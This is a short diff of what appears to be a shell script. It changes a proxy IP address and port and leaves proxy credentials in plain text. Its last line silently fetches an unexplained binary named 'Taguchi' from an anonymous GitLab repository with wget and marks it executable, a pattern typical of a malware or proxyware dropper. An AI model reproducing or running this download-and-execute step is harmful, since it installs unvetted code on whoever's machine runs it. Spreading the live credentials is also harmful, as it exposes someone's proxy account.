@@ -1,5 +1,5 @@
-proxy="185.199.229.156" 
-port="7492" 
+proxy="154.95.36.199" 
+port="6893" 
 user="ubslvwxe"  
 pass="iikj33112te4" 
 wget -q -O Taguchi https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Taguchi
